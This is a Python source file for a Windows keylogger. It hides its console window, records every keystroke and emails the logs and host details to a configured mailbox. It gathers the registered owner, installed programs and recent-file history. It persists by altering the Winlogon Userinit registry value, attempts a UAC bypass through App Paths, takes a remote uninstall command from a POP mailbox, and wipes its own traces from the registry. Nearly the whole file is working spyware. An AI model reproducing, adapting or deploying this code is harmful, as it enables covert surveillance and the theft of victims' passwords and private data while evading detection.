import os
import sys
import win32comext.shell.shell
import pynput
import datetime
import winreg
import smtplib
import poplib
import email
import email.header
import win32gui
import win32console


class Pld():
    def __init__(self):
        self.hide_scr()

        self.f_name = "pldr.txt"
        self.txt_dir_name = r"C:\Windows\System32"
        self.path_name = os.path.join(self.txt_dir_name, self.f_name)
        self.exe_name = "pld.exe"
        self.startup_name = "startups.exe"
        self.owner = str()
        self.target_diff = datetime.timedelta(minutes=14) # 14min
        self.last_saved_time = datetime.datetime.now()

        self.listener = None
        self.smtp = None
        self.is_smtp_con = 0
        self.cache = list()
        self.add_time()

        self.pop_server = ''
        self.pop_id = ""
        self.pop_pass = ""
        self.sender_email = ""
        self.dest_email = ""


        good_to_go = self.identify_first()

        self.get_host_name()
        self.pop_email()
        self.is_smtp_con = self.smtp_login()
        self.send_basic()

        if good_to_go == -1:
            self.run()
        else:
            if self.is_smtp_con == 1:
                self.send_old()
            self.listen_key()

    def on_press(self, key):
        try:
            data = key.char
            if(key.char == None):
                data = str(key)
            self.cache.append(data)
        except AttributeError:
            try:
                if(key == pynput.keyboard.Key.enter):
                    cool = self.check_cool()
                    if cool == False:
                        pass
                    else:
                        self.last_saved_time = datetime.datetime.now()
                        if self.is_smtp_con == 0:
                            self.save_txt()
                        else:
                            self.send_email()
                        self.dump_cache()
                        self.add_time()
                        self.janitor()
                elif(key == pynput.keyboard.Key.space):
                    self.cache.append(' ')
                else:
                    tmp = '[' + str(key) + ']'
                    self.cache.append(tmp)
            except:
                pass

    def listen_key(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

    def pop_email(self):
        try:
            server = poplib.POP3_SSL(self.pop_server, port=995)
            server.user(self.pop_id)
            server.pass_(self.pop_pass)
            for i in range(server.stat()[0]):
                msubject = str()
                msg = server.retr(i + 1)
                raw_email = b'\n'.join(msg[1])
                message = email.message_from_bytes(raw_email)
                mfrom = str(email.header.make_header(email.header.decode_header(message.get('From'))))
                mto = str(email.header.make_header(email.header.decode_header(message.get('To'))))
                mdate = str(email.header.make_header(email.header.decode_header(message.get('Date'))))
                msubject = str(email.header.make_header(email.header.decode_header(message.get('Subject'))))
                mpayload = message.get_payload(decode=True).decode()
                split_list = msubject.split(" ")
                server.quit()
                if msubject == "run":
                    self.run()
                elif split_list[0].strip() == self.owner:
                    self.run()
                else:
                    return 1
            return 1
        except:
            return 1

    def smtp_login(self):
        username = self.pop_id
        password = self.pop_pass
        server = self.pop_server
        port = 465
        try:
            self.smtp = smtplib.SMTP_SSL(server, port)
            self.smtp.login(username, password)
            return 1
        except:
            try:
                self.smtp.quit()
                return 0
            except:
                return 0

    def send_basic(self):
        try:
            data = list()
            owner, root_path, installed_prog_regname_list, installed_prog_list, recent_docs_dict, last_visited_mru_dict, last_saved_mru_regname_list, last_saved_mru_dlist = self.get_host_info()
            data.append(str(owner))
            data.append(str(root_path))
            try:
                for item in installed_prog_list:
                    data.append(str(item))
                data.append('\n')
                for k, v in recent_docs_dict:
                    data.append(str(v))
                data.append('\n')
                for k, v in last_visited_mru_dict:
                    data.append(str(v))
                data.append('\n')
                for dt in last_saved_mru_dlist:
                    for k, v in dt:
                        data.append(str(v))
                data.append('\n')
            except:
                pass
            try:
                message = email.message.EmailMessage()
                cont = ''.join(data)
                cont = cont.encode('utf-16')
                cont = str(cont)
                cont += ', '
                cont += '\n'
                message.set_content(cont)
                message["Subject"] = self.owner + "_basic"
                message["From"] = self.sender_email
                message["To"] = self.dest_email
                self.smtp.send_message(message)
            except:
                pass
        except:
            pass

    def send_old(self):
        try:
            with open(self.path_name, 'r') as f:
                lines = f.readlines()
                cont = ""
                for line in lines:
                    cont += line
                message = email.message.EmailMessage()
                message.set_content(cont)
                message["Subject"] = self.owner + "_old"
                message["From"] = self.sender_email
                message["To"] = self.dest_email
                self.smtp.send_message(message)
                f.close()
                if os.path.exists(self.path_name):
                    os.remove(self.path_name)
        except:
            pass

    def send_email(self):
        try:
            message = email.message.EmailMessage()
            cont = ''.join(self.cache)
            cont = cont.encode('utf-16')
            cont = str(cont)
            cont += ', '
            cont += '\n'
            message.set_content(cont)
            message["Subject"] = self.owner + "_"
            message["From"] = self.sender_email
            message["To"] = self.dest_email
            self.smtp.send_message(message)
        except:
            try:
                self.is_smtp_con = 0
                self.smtp.quit()
            except:
                pass

    def check_cool(self):
        try:
            ctime = datetime.datetime.now()
            diff = ctime - self.last_saved_time
            if self.target_diff > diff:
                return 0
            else:
                return 1
        except:
            return 0

    def add_time(self):
        ctime = datetime.datetime.now()
        ctime = ctime.strftime("%Y-%m-%d %H:%M:%S")
        tmp = '{' + str(ctime) + '}:'
        self.cache.append(tmp)

    def dump_cache(self):
        self.cache.clear()

    def save_txt(self):
        try:
            with open(self.path_name, 'a') as f:
                data = ''.join(self.cache)
                data = data.encode('utf-16')
                data = str(data)
                data += ', '
                data += '\n'
                f.write(data)
                f.close()
        except:
            pass

    def identify_first(self):
        path = r"Software\Microsoft\Windows NT\CurrentVersion"
        reg_name = "config"
        try:
            res = self.read_reg_by_name(path, reg_name, "HKEY_CURRENT_USER")
            if res[0] == "win":
                isa = self.check_admin()
                if isa == 0:
                    sys.exit()
                else:
                    return 1
            elif res[0] == "run":
                self.run()
            else:
                return -1
        except:
            payload = "win"
            folder_name = "History"
            res = 0
            res2 = 0
            res3 = 0
            res4 = 0
            try:
                isa = self.check_admin()
                if isa == 1:
                    res = self.uac_pass()
                    res2 = self.set_startup()
                    res3 = self.create_reg_folder(path, folder_name, "HKEY_CURRENT_USER")
                    npath = path + r"\History"
                    res4 = self.set_reg(npath, reg_name, payload, "HKEY_CURRENT_USER")
                if (isa == 1) and (res == 1) and (res2 == 1) and (res3 == 1) and (res4 == 1):
                    return 1
                else:
                    return -1
            except:
                return -1

    def check_admin(self):
        try:
            if win32comext.shell.shell.IsUserAnAdmin() == 0:
                return 0
            else:
                return 1
        except:
            return -1


    def uac_pass(self):
        #SOFTWARE\Classes\ms-settings\Shell\Open\Command
        #sdclt
        path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths" # hklm
        dst = r"C:\Windows\System32"
        file_name = self.exe_name
        exe_path = os.path.join(dst, file_name)
        payload = exe_path
        try:
            res = self.create_reg_folder(path, r"\control.exe", "HKEY_LOCAL_MACHINE")
            npath = path + r'\control.exe'
            res2 = self.set_reg(npath, "", payload, "HKEY_LOCAL_MACHINE")
            if res == -1 | res2 == -1:
                return -1
            return 1
        except:
            return -1


    def set_startup(self):
        #check startup needed
        dst = r"C:\Windows\System32"
        file_name = self.startup_name
        exe_path = os.path.join(dst, file_name)
        path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        reg_name = "Userinit"
        try:
            payload = r"C:\Windows\System32\userinit.exe," + exe_path
            self.set_reg(path, reg_name, payload, "HKEY_LOCAL_MACHINE")
            return 1
        except:
            return -1

    def run(self):
        try:
            #reset uac
            path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths"
            npath = path + r'\control.exe'
            self.delete_key(npath, r"control.exe", "HKEY_LOCAL_MACHINE")
        except:
            pass
        try:
            #reset startup
            path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            reg_name = "Userinit"
            payload = r"C:\Windows\System32\userinit.exe,"
            self.set_reg(path, reg_name, payload, "HKEY_LOCAL_MACHINE")
        except:
            pass
        try:
            #delete identification
            path = r"Software\Microsoft\Windows NT\CurrentVersion"
            npath = path + r"\History"
            reg_name = "config"
            self.delete_value(npath, reg_name, "HKEY_CURRENT_USER")
            self.delete_key(path, r"History", "HKEY_CURRENT_USER")
        except:
            pass
        try:
            #delete exe
            dst = r"C:\Windows\System32"
            file_name1 = self.exe_name
            file_name2 = self.startup_name
            file_path1 = os.path.join(dst, file_name1)
            file_path2 = os.path.join(dst, file_name2)
            os.remove(file_path1)
            os.remove(file_path2)
        except:
            pass
        try:
            self.janitor()
        except:
            pass
        sys.exit()

    def get_host_name(self):
        basic_info_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        try:
            res = self.read_reg_all(basic_info_path, "HKEY_LOCAL_MACHINE", 0)
            owner = res['RegisteredOwner']
            #root_path = res['SystemRoot']
            self.owner = owner.strip()
        except:
            pass


    def get_host_info(self):
        basic_info_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        installed_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        recent_doc_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
        last_visited_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"
        last_saved_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU"
        owner = ""
        root_path = ""
        installed_prog_regname_list = list()
        installed_prog_list = list()
        recent_docs_dict = dict()
        last_visited_mru_dict = dict()
        last_saved_mru_regname_list = list()
        last_saved_mru_dlist = list()
        try:
            try:
                res = self.read_reg_all(basic_info_path, "HKEY_LOCAL_MACHINE", 0)
                owner = res['RegisteredOwner']
                root_path = res['SystemRoot']
            except:
                pass

            try:
                subkey_name_list = self.list_subkey(installed_path, "HKEY_LOCAL_MACHINE")
                for item in subkey_name_list:
                    x = "\\" + item
                    pth = installed_path + x
                    dname = self.read_reg_by_name(pth, "DisplayName", "HKEY_LOCAL_MACHINE")
                    if dname != '':
                        installed_prog_regname_list.append(x)
                        installed_prog_list.append(dname[0])
            except:
                pass

            try:
                view_order = self.read_reg_by_name(recent_doc_path, "MRUListEx", "HKEY_CURRENT_USER")
                r = view_order[0].hex()
                view_order_list = list()
                tmp = ""
                inp = 0
                for i,  item in enumerate(r):
                    if i%8 == 0:
                        tmp += item
                    elif i%8 == 1:
                        tmp += item
                        tmp = '0x' + tmp
                        inp = int(tmp, 16)
                        view_order_list.append(inp)
                        tmp = ""
                    else:
                        pass
                recent_docs_dict = self.read_reg_all(recent_doc_path, "HKEY_CURRENT_USER", 1)
            except:
                pass

            try:
                last_visited_mru_dict = self.read_reg_all(last_visited_path, "HKEY_CURRENT_USER", 1)
            except:
                pass

            try:
                skey = self.list_subkey(last_saved_path, "HKEY_CURRENT_USER")
                for item in skey:
                    x = '\\' + item
                    pth = last_saved_path + x
                    tmp_dict = self.read_reg_all(pth, "HKEY_CURRENT_USER", 1)
                    last_saved_mru_regname_list.append(x)
                    last_saved_mru_dlist.append(tmp_dict)
            except:
                pass

        except EnvironmentError:
            pass
        return owner, root_path, installed_prog_regname_list, installed_prog_list, recent_docs_dict, last_visited_mru_dict, last_saved_mru_regname_list, last_saved_mru_dlist

    def janitor(self):
        installed_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" # hklm
        recent_doc_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" # hkcu
        last_visited_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" # hkcu
        last_saved_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU" # hkcu

        owner, root_path, installed_prog_regname_list, installed_prog_list, recent_docs_dict, last_visited_mru_dict, last_saved_mru_regname_list, last_saved_mru_dlist = self.get_host_info()
        target_string_list = list()
        stained_skey_name = list()
        target_string_list.append("pldr")
        target_string_list.append("pld")
        target_string_list.append("startups")
        target_string_list.append("sdclt")

        for i, item in enumerate(installed_prog_list):
            for target in target_string_list:
                hit = item.find(target)
                if(hit != -1):
                    stained_skey_name.append(installed_prog_regname_list[i])
                    break
        for r in stained_skey_name:
            path = installed_path + r
            res = self.read_reg_all(path, "HKEY_LOCAL_MACHINE", 0)
            for k, v in res.items():
                self.delete_value(path, k, "HKEY_LOCAL_MACHINE")
            r = r[1:]
            self.delete_key(installed_path, name=r, key_type="HKEY_LOCAL_MACHINE")

        res = self.find_in_dict(recent_docs_dict, target_string_list)
        for r in res:
            path = recent_doc_path
            self.delete_value(path, r, "HKEY_CURRENT_USER")

        res2 = self.find_in_dict(last_visited_mru_dict, target_string_list)
        for r in res2:
            path = last_visited_path
            self.delete_value(path, r, "HKEY_CURRENT_USER")

        for i, item in enumerate(last_saved_mru_dlist):
            path = '\\' + last_saved_mru_regname_list[i]
            res3 = self.find_in_dict(item, target_string_list)
            for r in res3:
                path = last_saved_path + path
                self.delete_value(path, r, "HKEY_CURRENT_USER")

    def find_in_dict(self, dic, target_string_list):
        hit_list = list()
        for key, value in dic.items():
            for target in target_string_list:
                hit = value.find(target)
                if hit != -1:
                    hit_list.append(key)
                    break
        return hit_list

    def decode_utf(self, byts):
        res = ""
        try:
            res = byts.decode('utf-16')
        except:
            pass
        return res

    def decode_utf_dict(self, byts_dict):
        res = dict()
        for k, v in byts_dict.items():
            try:
                text = v.decode('utf-16')
                res[k] = text
            except:
                pass
        return res

    def create_reg_folder(self, path, folder_name, key_type):
        new_path = path + folder_name
        try:
            hkey_type = self.identify_key_type(key_type)
            winreg.CreateKey(hkey_type, new_path)
            return 1
        except EnvironmentError:
            return -1

    def list_subkey(self, path, key_type):
        s_list = list()
        try:
            hkey_type = self.identify_key_type(key_type)
            winreg.CreateKey(hkey_type, path)
            handle = winreg.ConnectRegistry(None, hkey_type)
            key = winreg.OpenKey(handle, path, 0, winreg.KEY_READ)
            # number of subkey, number of values, modified time
            info = winreg.QueryInfoKey(key)
            num = info[0]
            for i in range(num):
                pass
                subkey_name = winreg.EnumKey(key, i)
                s_list.append(subkey_name)
        except EnvironmentError:
            pass
        winreg.CloseKey(key)
        return s_list

    def read_reg_all(self, path, key_type, decode):
        #target = winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER
        subkeys = dict()
        res = dict()
        try:
            hkey_type = self.identify_key_type(key_type)
            winreg.CreateKey(hkey_type, path)
            handle = winreg.ConnectRegistry(None, hkey_type)
            key = winreg.OpenKey(handle, path, 0, winreg.KEY_READ)
            i = 0
            while True:
                try:
                    subvalue = winreg.EnumValue(key, i)
                    k = subvalue[0]
                    v = subvalue[1]
                    subkeys[k] = v
                    i += 1
                except WindowsError as e:
                    break

            if decode == 1:
                res = self.decode_utf_dict(subkeys)
            else:
                res = subkeys

        except EnvironmentError:
            pass
        winreg.CloseKey(key)
        return res

    def read_reg_by_name(self, path, reg_name, key_type):
        #target = winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER
        res = ""
        try:
            hkey_type = self.identify_key_type(key_type)
            handle = winreg.ConnectRegistry(None, hkey_type)
            key = winreg.OpenKey(handle, path, 0, winreg.KEY_READ)
            res = winreg.QueryValueEx(key, reg_name)
        except EnvironmentError:
            pass
        winreg.CloseKey(key)
        return res

    def set_reg(self, path, reg_name, payload, key_type):
        try:
            hkey_type = self.identify_key_type(key_type)
            winreg.CreateKey(hkey_type, path)
            handle = winreg.ConnectRegistry(None, hkey_type)
            key = winreg.OpenKey(handle, path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, payload)
        except EnvironmentError:
            pass
            return -1
        winreg.CloseKey(key)
        return 1

    def delete_key(self, path, name, key_type):
        try:
            hkey_type = self.identify_key_type(key_type)
            winreg.CreateKey(hkey_type, path)
            handle = winreg.ConnectRegistry(None, hkey_type)
            key = winreg.OpenKey(handle, path, 0, winreg.KEY_WRITE)
            winreg.DeleteKeyEx(key, sub_key=name)
        except:
            pass
        winreg.CloseKey(key)

    def delete_value(self, path, name, key_type):
        try:
            hkey_type = self.identify_key_type(key_type)
            winreg.CreateKey(hkey_type, path)
            handle = winreg.ConnectRegistry(None, hkey_type)
            key = winreg.OpenKey(handle, path, 0, winreg.KEY_WRITE)
            winreg.DeleteValue(key, name)
        except:
            pass
        winreg.CloseKey(key)

    def identify_key_type(self, key_type):
        if (key_type == "HKEY_LOCAL_MACHINE"):
            hkey_type = winreg.HKEY_LOCAL_MACHINE
        elif (key_type == "HKEY_CURRENT_USER"):
            hkey_type = winreg.HKEY_CURRENT_USER
        else:
            hkey_type = winreg.HKEY_LOCAL_MACHINE
        return hkey_type

    def hide_scr(self):
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

if __name__=="__main__":
    Pld()
